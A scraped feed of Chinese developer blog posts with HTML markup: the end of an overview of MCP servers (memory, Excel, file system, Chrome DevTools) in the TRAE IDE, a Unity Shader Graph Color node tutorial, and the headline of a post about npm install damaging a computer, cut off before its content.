<table><thead><tr><th><strong>概念</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>Entity</td><td>知识图谱中的主要节点，表示一个具体、可识别的对象。</td></tr><tr><td>Relation</td><td>用于定义 Entity 之间的有向连接。它们始终以主动语态存储，用于描述 Entity 之间的交互方式或相互关系。</td></tr><tr><td>Observation</td><td>关于某个 Entity 的离散信息片段，可不断新增、修改或删除。</td></tr></tbody></table>
<h4 data-id="heading-28"><strong>核心功能</strong></h4>
<ul>
<li>
<p><strong>结构化、持久化记忆：</strong> 将用户相关信息以 Entity-Relation-Observation 的形式存储。存储的信息会跨会话持续存在，不随单次对话结束而丢失。</p>
</li>
<li>
<p><strong>记忆的增量演化：</strong> 支持向已有 Entity 不断添加新的 Observation，以及创建和调整 Entity 之间的 Relation。</p>
</li>
<li>
<p><strong>查询与维护记忆：</strong> 支持按条件搜索节点。可读取整个知识图谱，便于调试和理解记忆。</p>
</li>
<li>
<p><strong>清理记忆：</strong> 支持删除指定 Entity 及其关联的 Relation；支持删除指定 Observation 或 Relation，避免记忆污染。 </p>
</li>
</ul>
<h4 data-id="heading-29"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>跨会话用户记忆：</strong> 记住你的偏好、背景、项目状态等信息，从而在后续对话中提供更连续、一致的体验。</p>
</li>
<li>
<p><strong>Agent 的长期状态管理：</strong> 让 AI Agent 拥有可演化的“内部状态”，支撑长期任务与多轮协作。</p>
</li>
<li>
<p><strong>复杂上下文的结构化管理：</strong> 避免将大量历史信息堆叠在 Prompt 中，提高上下文可控性与可维护性。</p>
</li>
<li>
<p><strong>可解释的 AI 记忆系统：</strong> 通过知识图谱，清晰展示模型所记住的信息，便于调试和人工干预。 </p>
</li>
</ul>
<h4 data-id="heading-30"><strong>工具</strong></h4>
<p>​Memory MCP Server 为 LLM 提供以下可调用的工具：</p>













































<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>create_entities</td><td>在知识图谱中创建多个新 Entity。</td></tr><tr><td>create_relations</td><td>在 Entity 之间创建多条新关系。</td></tr><tr><td>add_observations</td><td>向已有 Entity 添加新 Observation。</td></tr><tr><td>delete_entities</td><td>删除 Entity 及其所有 Relation。</td></tr><tr><td>delete_observations</td><td>从 Entity 中删除指定的 Observation。</td></tr><tr><td>delete_relations</td><td>从知识图谱中删除指定的 Relation。</td></tr><tr><td>read_graph</td><td>读取整个知识图谱。</td></tr><tr><td>search_nodes</td><td>根据查询条件搜索节点。</td></tr><tr><td>open_nodes</td><td>按名称获取指定节点。</td></tr></tbody></table>
<h3 data-id="heading-31"><strong>Excel</strong></h3>
<p>Excel MCP Server 用于读取 Microsoft Excel 文件中的电子表格数据，或向其中写入数据。 </p>
<h4 data-id="heading-32"><strong>核心功能</strong></h4>
<ul>
<li>
<p>读取 / 写入文本值</p>
</li>
<li>
<p>读取 / 写入公式</p>
</li>
<li>
<p>创建新的工作表</p>
</li>
<li>
<p>(仅 Windows) 实时编辑</p>
</li>
<li>
<p>(仅 Windows) 为工作表截图 </p>
</li>
</ul>
<h4 data-id="heading-33"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>自动化数据处理：</strong> 批量读取、整理和写入 Excel 数据，自动生成结构化表格与计算公式。</p>
</li>
<li>
<p><strong>报表生成：</strong> 自动生成分析报表或业务数据表。</p>
</li>
<li>
<p><strong>办公自动化与 Agent 流程：</strong> 作为 AI Agent 操作办公文件的重要接口，可以与其他 MCP Server 协同使用。</p>
</li>
<li>
<p><strong>可视化结果校验（Windows）：</strong> 通过截图方式确认表格的布局与内容是否符合预期。 </p>
</li>
</ul>
<h4 data-id="heading-34"><strong>工具</strong></h4>





































<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>excel_describe_sheets</td><td>列出指定 Excel 文件中的所有工作表信息。</td></tr><tr><td>excel_read_sheet</td><td>以分页方式读取 Excel 工作表中的数据。</td></tr><tr><td>excel_screen_capture</td><td>（仅 Windows） 以分页方式为 Excel 工作表截图。</td></tr><tr><td>excel_write_to_sheet</td><td>向 Excel 工作表写入数据。</td></tr><tr><td>excel_create_table</td><td>在 Excel 工作表中创建表格。</td></tr><tr><td>excel_copy_sheet</td><td>将现有工作表复制为一个新的工作表。</td></tr><tr><td>excel_format_range</td><td>为 Excel 工作表中的单元格设置样式格式。</td></tr></tbody></table>
<h3 data-id="heading-35"><strong>File System</strong></h3>
<p>File System MCP Server 提供基于文件系统的文件读取能力。</p>
<h4 data-id="heading-36"><strong>主要功能</strong></h4>
<ul>
<li>
<p>通过 MCP 实现无缝的文件读取。</p>
</li>
<li>
<p>命令行式的 API Key 配置。 </p>
</li>
</ul>
<h4 data-id="heading-37"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>文档与配置读取：</strong> 在对话或自动化流程中直接读取项目文档、配置文件或说明文件，为模型提供准确的上下文。</p>
</li>
<li>
<p><strong>代码与资源分析：</strong> 读取源代码、脚本或资源文件，辅助进行代码理解、审查或问题定位。</p>
</li>
<li>
<p><strong>工作流集成：</strong> 将文件读取能力集成到现有流程中，减少手动复制粘贴文件内容，提高自动化水平。 </p>
</li>
</ul>
<h4 data-id="heading-38"><strong>工具</strong></h4>
<p>File System MCP Server 为 LLM 提供以下可调用的工具： </p>













<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>read-file </td><td>从文件系统读取文件。 </td></tr></tbody></table>
<h3 data-id="heading-39"><strong>Chrome DevTools MCP</strong></h3>
<p>Chrome DevTools MCP 让 AI 智能体能够直接控制并深入检查 Chrome 浏览器。它向 AI 开放了 Chrome DevTools 的全部能力，使其能更精准、高效地完成网页自动化测试、故障排查及性能分析等任务。</p>
<h4 data-id="heading-40"><strong>主要功能</strong></h4>
<ul>
<li><strong>浏览器自动化：</strong> 通过 Chrome DevTools Protocol 在 Chrome 中自动化各类操作，并自动等待结果。</li>
<li><strong>性能洞察：</strong> 使用 Chrome DevTools 记录性能追踪（traces）数据，并提取可执行的性能优化策略。</li>
<li><strong>浏览器调试：</strong> 分析网络请求、截取屏幕截图，并检查浏览器控制台信息。</li>
</ul>
<h4 data-id="heading-41"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>浏览器相关操作自动化：</strong> 由 AI 直接控制 Chrome 来执行页面交互（导航、点击、输入、等待等），实现稳定、可复现的自动化流程。</p>
</li>
<li>
<p><strong>前端调试与问题排查：</strong> 访问控制台日志、网络请求和页面状态，辅助定位前端错误、接口异常等问题。</p>
</li>
<li>
<p><strong>性能分析与优化：</strong> 记录并分析性能追踪数据，获取性能洞察和 Core Web Vitals 指标，用于发现并处理页面的性能瓶颈。 </p>
</li>
</ul>
<h4 data-id="heading-42"><strong>工具</strong></h4>
<p>​Chrome DevTools MCP 为 LLM 提供以下可调用的工具：</p>





















































































































<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>click</td><td>点击指定的元素。</td></tr><tr><td>close_page</td><td>根据页面索引关闭页面。最后一个打开的页面不能被关闭。</td></tr><tr><td>drag</td><td>将一个元素拖拽到另一个元素上。</td></tr><tr><td>emulate</td><td>在选中的页面上模拟多种特性。</td></tr><tr><td>evaluate_script</td><td>在当前选中的页面中执行一个 JavaScript 函数，并将响应以 JSON 形式返回，使返回值可被 JSON 序列化。</td></tr><tr><td>fill</td><td>在输入框或文本区域中输入文本，或从  元素中选择一个选项。</td></tr><tr><td>fill_form</td><td>一次性填写多个表单元素。</td></tr><tr><td>get_console_message</td><td>根据 ID 获取一条控制台消息。你可以通过调用 list_console_messages 获取所有消息</td></tr><tr><td>get_network_request</td><td>根据可选的 reqid 获取一条网络请求；如果省略，则返回 DevTools Network 面板中当前选中的请求。</td></tr><tr><td>handle_dialog</td><td>如果打开了浏览器对话框，使用该命令进行处理。</td></tr><tr><td>hover</td><td>将鼠标悬停在提供的元素上。</td></tr><tr><td>list_console_messages</td><td>列出自上次导航以来，当前选中页面的所有控制台消息。</td></tr><tr><td>list_network_requests</td><td>列出自上次导航以来，当前选中页面的所有网络请求。</td></tr><tr><td>list_pages</td><td>获取浏览器中打开的页面列表。</td></tr><tr><td>navigate_page</td><td>将当前选中的页面导航到一个 URL。</td></tr><tr><td>new_page</td><td>创建一个新的页面。</td></tr><tr><td>performance_analyze_insight</td><td>针对追踪记录结果中高亮显示的某个 Performance Insight，提供更详细的信息。</td></tr><tr><td>performance_start_trace</td><td>在选中的页面上开始性能追踪记录。该记录可用于查找性能问题并获取改进页面性能的洞察，同时还会报告页面的 Core Web Vital（CWV）分数。</td></tr><tr><td>performance_stop_trace</td><td>在所选中页面上，停止活跃的性能追踪记录。</td></tr><tr><td>press_key</td><td>按下某个按键或组合键。当无法使用其他输入方式（如 fill（））时使用（例如键盘快捷键、导航键或特殊组合键）。</td></tr><tr><td>resize_page</td><td>调整所选中页面的窗口的大小，使页面具有指定的尺寸。</td></tr><tr><td>select_page</td><td>选择一个页面，作为后续工具调用的上下文。</td></tr><tr><td>take_screenshot</td><td>对页面或元素进行截图。</td></tr><tr><td>take_snapshot</td><td>基于 a11y（Accessibility）树，对当前选中的页面生成文本快照。快照会列出页面元素及其唯一标识（uid）。始终使用最新快照。相比截图，优先使用快照。快照会指示 DevTools Elements 面板中选中的元素（如果有）。</td></tr><tr><td>upload_file</td><td>选择一个页面，作为后续工具调用的上下文。</td></tr><tr><td>upload_file</td><td>通过提供的元素上传文件。</td></tr><tr><td>wait_for</td><td>等待指定文本出现在选中的页面上。</td></tr></tbody></table>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1861608f453649be9e53b6142e2e49c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=amcewIZtTIa%2FpdR2K0JS2qUdJcE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-43"><strong>如何添加这些 MCP Server？</strong></h2>
<p>你可以直接从 TRAE IDE 内置的 MCP 市场添加。</p>
<p><strong>1.</strong> 进入 MCP 设置中心：</p>
<ul>
<li><strong>IDE 模式：</strong> 在 IDE 模式界面中，点击界面右上角的 <strong>设置</strong> 图标，进入设置中心。</li>
<li><strong>SOLO 模式：</strong> 在 SOLO 模式界面中，点击对话面板右上角的 <strong>设置</strong> 图标，进入设置中心。</li>
</ul>
<p><strong>2.</strong> 在左侧导航栏中，选择 <strong>MCP</strong>，打开 <strong>MCP</strong> 窗口。</p>
<p><strong>3.</strong> 在 <strong>MCP</strong> 窗口的右上角，点击 <strong>添加 &gt; 从市场添加</strong>。若你是首次添加 MCP Server，还可以直接点击窗口中部的 <strong>从市场添加</strong> 按钮。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e2e829c59714626bed61115f92a321b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=jZ72Xag2td7vpEScDlvO3cCOVuY%3D" alt="微信图片_20260114153022_1702.jpg" loading="lazy"/></p>
<p><strong>4.</strong> 在 MCP 市场中找到所需的 MCP Server。</p>
<p><strong>5.</strong> 点击右侧的 <strong>+</strong> 按钮。</p>
<p><strong>6.</strong> 在弹窗中填入 MCP Server 的配置信息。</p>
<ul>
<li>
<p>对于标记为 “Local” 的 MCP Server，需要在本地安装 NPX 或 UVX 后才能使用。</p>
</li>
<li>
<p>配置内容中的 env 信息（例如 API Key、Token、Access Key 等字段）需替换为真实信息。</p>
</li>
</ul>
<p><strong>7.</strong> 点击 <strong>确认</strong> 按钮，即代表配置成功。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9acf8b70ed664ababdc5fe1ae2523bf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=azSnpL3ui2VlThyey0MYpC%2BKfmk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-44"><strong>结语</strong></h2>
<p>以上是在 TRAE IDE 中的 10个 热门 MCP Server 的详细介绍，快来立即体验使用吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【节点】[Color节点]原理解析与实际应用]]></title>    <link>https://juejin.cn/post/7594859060858437642</link>    <guid>https://juejin.cn/post/7594859060858437642</guid>    <pubDate>2026-01-14T07:36:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594859060858437642" data-draft-id="7594859060858241034" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【节点】[Color节点]原理解析与实际应用"/> <meta itemprop="keywords" content="游戏开发,图形学,Unity3D"/> <meta itemprop="datePublished" content="2026-01-14T07:36:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SmalBox"/> <meta itemprop="url" content="https://juejin.cn/user/2218166695237532"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【节点】[Color节点]原理解析与实际应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2218166695237532/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SmalBox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:36:20.000Z" title="Wed Jan 14 2026 07:36:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">【Unity Shader Graph 使用与特效实现】</a><strong>专栏-直达</strong></p>
</blockquote>
<p>Color节点是Shader Graph中最基础且使用频率最高的节点之一，它用于定义和输出颜色值。在视觉着色器开发过程中，Color节点扮演着色彩定义的核心角色，无论是设置物体表面颜色、调整光照反射率，还是创建复杂的材质效果，都离不开对颜色的精确控制。</p>
<h2 data-id="heading-0">节点基本属性</h2>
<p><img src="https://docs.unity.cn/cn/Packages-cn/com.unity.shadergraph@14.0/manual/images/ColorNodeThumb.png" alt="" loading="lazy"/></p>
<p>Color节点提供了一个直观的颜色选择界面，让开发者能够轻松定义所需的颜色值。该节点输出一个四维向量（Vector 4），分别对应颜色的红（R）、绿（G）、蓝（B）和透明度（A）通道。</p>
<p>在Shader Graph工作区中，Color节点通常显示为一个带有颜色预览的小方块，右侧有一个输出端口。双击节点或点击颜色预览区域可以打开颜色选择器，进行精确的颜色调整。</p>
<h3 data-id="heading-1">颜色模式详解</h3>
<p>Color节点支持两种不同的颜色模式，这两种模式对应着不同的颜色处理流程和视觉效果：</p>
<ul>
<li>Default模式：在此模式下，颜色值被视为sRGB空间中的值。当在Gamma颜色空间中进行渲染时，这些值会被直接使用；而当在Linear颜色空间中进行渲染时，它们会被自动转换为线性值。这种自动转换确保了颜色在不同渲染环境下的一致性，是大多数标准材质颜色的理想选择。</li>
<li>HDR模式：高动态范围模式允许颜色值超过传统的0-1范围，特别适用于发光表面、自发光材质和后期处理效果。HDR颜色能够表示比白色更亮的颜色值，为Bloom、泛光等特效提供了必要的亮度信息。当使用HDR模式时，颜色选择器会显示额外的亮度控制滑块，允许定义超过1的亮度值。</li>
</ul>
<h2 data-id="heading-2">控件参数详解</h2>
<h3 data-id="heading-3">颜色选择器功能</h3>
<p>Color节点的核心控件是一个功能完整的颜色选择器，提供了多种颜色定义方式：</p>
<ul>
<li>可视化选取：通过色相环和亮度/饱和度方块进行直观的颜色选择</li>
<li>数值输入：支持RGB（0-255或0-1）、HSV和十六进制颜色代码输入</li>
<li>颜色预设：可以保存和调用常用颜色，提高工作效率</li>
<li>透明度控制：通过Alpha滑块或数值输入控制颜色的不透明度</li>
</ul>
<h3 data-id="heading-4">模式选择策略</h3>
<p>选择合适的颜色模式对于实现预期的视觉效果至关重要：</p>
<ul>
<li>对于漫反射颜色、基础色调和大多数表面属性，应使用Default模式</li>
<li>对于自发光材质、灯光效果、粒子系统和需要Bloom效果的表面，应使用HDR模式</li>
<li>在URP中，HDR颜色通常与后期处理的Bloom效果配合使用，创建出明亮的发光效果</li>
</ul>
<h2 data-id="heading-5">端口特性分析</h2>
<p>Color节点的输出端口设计简洁但功能强大：</p>
<ul>
<li>输出类型：Vector 4（四维向量）</li>
<li>数据范围：在Default模式下，各通道通常为0-1；在HDR模式下，RGB通道可以超过1</li>
<li>通道对应：输出向量的四个分量分别对应R、G、B、A通道</li>
</ul>
<h3 data-id="heading-6">输出数据应用</h3>
<p>Color节点的输出可以连接到Shader Graph中的几乎所有输入端口，包括：</p>
<ul>
<li>表面基础颜色</li>
<li>发射颜色</li>
<li>透明度值</li>
<li>其他需要颜色输入的节点参数</li>
</ul>
<h2 data-id="heading-7">生成的代码解析</h2>
<p>Color节点生成的代码反映了Unity的颜色管理策略，特别是颜色空间的自动处理：</p>
<pre><code class="hljs language-scss" lang="scss">HLSL

float4 _Color = <span class="hljs-built_in">IsGammaSpace</span>() ? <span class="hljs-built_in">float4</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>) : <span class="hljs-built_in">float4</span>(<span class="hljs-built_in">SRGBToLinear</span>(<span class="hljs-built_in">float3</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)), <span class="hljs-number">4</span>);
</code></pre>
<p>这段代码展示了Unity如何根据当前的颜色空间自动处理颜色值：</p>
<ul>
<li>在Gamma颜色空间中，颜色值被直接使用</li>
<li>在Linear颜色空间中，RGB值会通过SRGBToLinear函数进行转换，确保颜色计算的物理准确性</li>
<li>这种自动转换保证了着色器在不同项目设置下的一致性</li>
</ul>
<h3 data-id="heading-8">代码生成机制</h3>
<p>理解生成的代码有助于调试复杂的着色器问题：</p>
<ul>
<li>条件编译确保颜色空间正确的处理</li>
<li>SRGBToLinear函数应用了标准的sRGB到线性空间的转换公式</li>
<li>Alpha通道通常不受颜色空间转换影响，保持原值</li>
</ul>
<h2 data-id="heading-9">实际应用场景</h2>
<h3 data-id="heading-10">基础材质着色</h3>
<p>Color节点最基本的应用是定义物体的表面颜色：</p>
<ul>
<li>连接到主节点的Base Color输入，定义材质的基础色调</li>
<li>与其他纹理节点结合使用，实现色彩叠加和混合效果</li>
<li>通过透明度通道控制材质的透明程度</li>
</ul>
<h3 data-id="heading-11">HDR效果实现</h3>
<p>使用HDR模式的Color节点可以创建各种高动态范围视觉效果：</p>
<ul>
<li>自发光表面：将HDR颜色连接到Emission输入，创建发光材质</li>
<li>Bloom效果源：明亮的HDR颜色会自动触发URP的Bloom后期处理</li>
<li>场景灯光模拟：使用HDR颜色模拟强光源和反射表面</li>
</ul>
<h3 data-id="heading-12">色彩混合与调制</h3>
<p>Color节点经常与其他节点结合使用，实现复杂的色彩效果：</p>
<ul>
<li>与Sample Texture 2D节点相乘，实现纹理着色</li>
<li>与Lerp节点配合，实现颜色间的平滑过渡</li>
<li>通过Time节点动态改变颜色值，创建动画效果</li>
</ul>
<h2 data-id="heading-13">高级使用技巧</h2>
<h3 data-id="heading-14">色彩空间意识</h3>
<p>在使用Color节点时，理解色彩空间的影响至关重要：</p>
<ul>
<li>在Linear颜色空间项目中，颜色计算更加物理准确</li>
<li>Gamma颜色空间中的颜色值需要转换才能正确参与光照计算</li>
<li>Color节点的自动转换机制简化了这一过程，但了解原理有助于调试</li>
</ul>
<h3 data-id="heading-15">性能优化考虑</h3>
<p>合理使用Color节点有助于优化着色器性能：</p>
<ul>
<li>避免在片段着色器中使用复杂的颜色计算，尽量在顶点着色器或常量中定义</li>
<li>对于静态颜色，考虑使用Material Property而不是复杂的节点网络</li>
<li>HDR颜色会增加片元着色器的计算负担，应适度使用</li>
</ul>
<h3 data-id="heading-16">与其他节点配合</h3>
<p>Color节点可以与多种其他Shader Graph节点结合，创建复杂效果：</p>
<ul>
<li>与Math节点结合，实现程序化颜色生成</li>
<li>与Gradient节点配合，创建平滑的颜色渐变</li>
<li>与Noise节点结合，生成自然的外观变化</li>
</ul>
<h2 data-id="heading-17">常见问题与解决方案</h2>
<h3 data-id="heading-18">颜色显示不一致</h3>
<p>在不同设备或渲染环境下颜色显示不一致是常见问题：</p>
<ul>
<li>确保正确理解和使用颜色模式</li>
<li>检查项目的颜色空间设置</li>
<li>验证显示设备的色彩校准情况</li>
</ul>
<h3 data-id="heading-19">HDR效果不明显</h3>
<p>当HDR颜色没有产生预期的发光效果时：</p>
<ul>
<li>检查URP渲染器设置中的Bloom后期处理是否启用</li>
<li>验证HDR颜色的亮度值是否足够高（通常需要超过1）</li>
<li>确认材质表面的Emission强度设置</li>
</ul>
<h3 data-id="heading-20">性能问题排查</h3>
<p>如果着色器出现性能问题：</p>
<ul>
<li>检查是否不必要地使用了HDR颜色</li>
<li>验证颜色计算是否可以在更早的着色阶段完成</li>
<li>考虑使用更简单的颜色表示方法</li>
</ul>
<h2 data-id="heading-21">最佳实践建议</h2>
<p>根据项目需求和工作流程，以下Color节点的使用建议值得参考：</p>
<ul>
<li>在项目早期确定颜色管理策略，并保持一致性</li>
<li>使用有意义的命名规范区分Default和HDR颜色节点</li>
<li>建立颜色预设库，保持项目视觉风格的一致性</li>
<li>定期在不同设备和光照环境下测试颜色表现</li>
<li>文档化复杂的颜色配置，便于团队协作和后期维护</li>
</ul>
<hr/>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">【Unity Shader Graph 使用与特效实现】</a><strong>专栏-直达</strong>
（欢迎<em>点赞留言</em>探讨，更多人加入进来能更加完善这个探索的过程，🙏）</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[装个依赖把公司电脑干报废了？npm i 到底背着我干了啥？]]></title>    <link>https://juejin.cn/post/7594835618119794728</link>    <guid>https://juejin.cn/post/7594835618119794728</guid>    <pubDate>2026-01-14T07:37:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594835618119794728" data-draft-id="7591382440582709288" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="装个依赖把公司电脑干报废了？npm i 